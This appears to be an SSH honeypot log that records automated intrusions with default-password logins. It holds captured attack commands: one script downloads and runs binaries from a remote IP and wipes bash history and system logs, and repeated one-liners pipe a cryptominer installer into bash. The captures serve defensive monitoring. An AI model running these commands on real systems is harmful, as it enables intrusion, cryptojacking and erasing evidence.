+2021-10-29 14:01:04,483 - root - INFO - client sent command via check_channel_exec_request (103.64.12.112): b'wdir="/bin"\nfor i in "/bin" "/home" "/root" "/tmp" "/usr" "/etc"\ndo\nif [ -w $i ]\nthen\nwdir=$i\nbreak\nfi\ndone\ncd $wdir\ncurl http://104.233.240.148/1.txt -o ygljglkjgfg0\nchmod +x ygljglkjgfg0\n./ygljglkjgfg0\nwget http://104.233.240.148/1.txt -O ygljglkjgfg1\nchmod +x ygljglkjgfg1\n./ygljglkjgfg1\ngood http://104.233.240.148/1.txt -O ygljglkjgfg2\nchmod +x ygljglkjgfg2\n./ygljglkjgfg2\nsleep 2\nwget http://104.233.240.148/1a.txt -O sdf3fslsdf13\nchmod +x sdf3fslsdf13\n./sdf3fslsdf13\ngood http://104.233.240.148/1a.txt -O sdf3fslsdf14\nchmod +x sdf3fslsdf14\n./sdf3fslsdf14\ncurl http://104.233.240.148/1a.txt -o sdf3fslsdf15\nchmod +x sdf3fslsdf15\n./sdf3fslsdf15\nsleep 2\nmv /usr/bin/wget /usr/bin/good\nmv /bin/wget /bin/good\ncat /dev/null >/root/.bash_history\ncat /dev/null > /var/log/wtmp\ncat /dev/null > /var/log/btmp\ncat /dev/null > /var/log/lastlog\ncat /dev/null > /var/log/secure\ncat /dev/null > /var/log/boot.log\ncat /dev/null > /var/log/cron\ncat /dev/null > /var/log/dmesg\ncat /dev/null > /var/log/firewalld\ncat /dev/null > /var/log/maillog\ncat /dev/null > /var/log/messages\ncat /dev/null > /var/log/spooler\ncat /dev/null > /var/log/syslog\ncat /dev/null > /var/log/tallylog\ncat /dev/null > /var/log/yum.log\ncat /dev/null >/root/.bash_history\nls -la /etc/daemon.cfg\nexit $?\n\n\n'
+2021-10-29 14:01:14,260 - root - INFO - ** Client (103.64.12.112): never asked for a shell
+2021-10-29 14:01:48,185 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:01:48,186 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:01:48,976 - root - INFO - new client credentials (209.141.60.103): username: ansible, password: 123456
+2021-10-29 14:01:48,976 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:01:49,126 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:01:49,126 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:01:49,126 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:01:49,126 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:01:49,126 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:01:49,279 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:01:49,279 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:01:59,126 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:02:43,706 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:02:43,708 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:02:44,484 - root - INFO - new client credentials (209.141.60.103): username: oracle, password: oracle123
+2021-10-29 14:02:44,484 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:02:44,638 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:02:44,638 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:02:44,638 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:02:44,638 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:02:44,638 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:02:44,787 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:02:44,788 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:02:54,638 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:03:38,263 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:03:38,264 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:03:39,034 - root - INFO - new client credentials (209.141.60.103): username: root, password: pass
+2021-10-29 14:03:39,034 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:03:39,185 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:03:39,186 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:03:39,186 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:03:39,186 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:03:39,186 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:03:39,339 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:03:39,339 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:03:49,186 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:04:33,280 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:04:33,281 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:04:34,063 - root - INFO - new client credentials (209.141.60.103): username: root, password: redhat
+2021-10-29 14:04:34,063 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:04:34,219 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:04:34,220 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:04:34,220 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:04:34,220 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:04:34,220 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:04:34,372 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:04:34,372 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:04:44,220 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:05:31,748 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:05:31,752 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:05:32,517 - root - INFO - new client credentials (209.141.60.103): username: ftpadmin, password: ftpadmin
+2021-10-29 14:05:32,517 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:05:32,661 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:05:32,662 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:05:32,662 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:05:32,662 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:05:32,662 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:05:32,811 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:05:32,811 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:05:42,662 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:06:27,517 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:06:27,518 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:06:28,283 - root - INFO - new client credentials (209.141.60.103): username: test, password: test
+2021-10-29 14:06:28,283 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:06:28,430 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:06:28,431 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:06:28,431 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:06:28,431 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:06:28,431 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:06:28,577 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:06:28,578 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:06:38,431 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:07:20,412 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:07:20,413 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:07:21,182 - root - INFO - new client credentials (209.141.60.103): username: testuser, password: testuser
+2021-10-29 14:07:21,182 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:07:21,327 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:07:21,327 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:07:21,327 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:07:21,327 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:07:21,327 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:07:21,479 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:07:21,479 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:07:31,327 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:08:15,341 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:08:15,342 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:08:16,102 - root - INFO - new client credentials (209.141.60.103): username: weblogic, password: weblogic
+2021-10-29 14:08:16,102 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:08:16,247 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:08:16,247 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:08:16,247 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:08:16,247 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:08:16,247 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:08:16,392 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:08:16,392 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:08:26,247 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:09:08,499 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:09:08,501 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:09:09,282 - root - INFO - new client credentials (209.141.60.103): username: storage, password: 123456
+2021-10-29 14:09:09,282 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:09:09,425 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:09:09,426 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:09:09,426 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:09:09,426 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:09:09,426 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:09:09,572 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:09:09,593 - paramiko.transport - ERROR - Unknown exception: Error -3 connecting to ssh_honeypot_redis_db:6379. Temporary failure in name resolution.
+2021-10-29 14:09:09,604 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 14:09:09,604 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 1198, in get_connection
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     if connection.can_read():
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 734, in can_read
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     return self._parser.can_read(timeout)
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 321, in can_read
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     return self._buffer and self._buffer.can_read(timeout)
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 230, in can_read
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     self._read_from_socket(timeout=timeout,
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 201, in _read_from_socket
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     raise ConnectionError(SERVER_CLOSED_CONNECTION_ERROR)
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - redis.exceptions.ConnectionError: Connection closed by server.
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - 
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - During handling of the above exception, another exception occurred:
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - 
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 559, in connect
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     sock = self._connect()
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 584, in _connect
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     for res in socket.getaddrinfo(self.host, self.port, self.socket_type,
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/socket.py", line 955, in getaddrinfo
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR -     for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - socket.gaierror: [Errno -3] Temporary failure in name resolution
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - 
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - During handling of the above exception, another exception occurred:
+2021-10-29 14:09:09,605 - paramiko.transport - ERROR - 
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2088, in run
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     self._channel_handler_table[ptype](chan, m)
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/channel.py", line 1115, in _handle_request
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     ok = server.check_channel_exec_request(self, cmd)
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/src/app/ssh_honeypot.py", line 121, in check_channel_exec_request
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     handle_cmd(command_text, channel, self.client_ip)
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/src/app/ssh_honeypot.py", line 55, in handle_cmd
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     detect_url(cmd, ip)
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/src/app/ssh_honeypot.py", line 43, in detect_url
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     r.lpush("download_queue", url)
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/client.py", line 1961, in lpush
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     return self.execute_command('LPUSH', name, *values)
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/client.py", line 898, in execute_command
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     conn = self.connection or pool.get_connection(command_name, **options)
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 1202, in get_connection
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     connection.connect()
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/redis/connection.py", line 563, in connect
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR -     raise ConnectionError(self._error_message(e))
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR - redis.exceptions.ConnectionError: Error -3 connecting to ssh_honeypot_redis_db:6379. Temporary failure in name resolution.
+2021-10-29 14:09:09,606 - paramiko.transport - ERROR - 
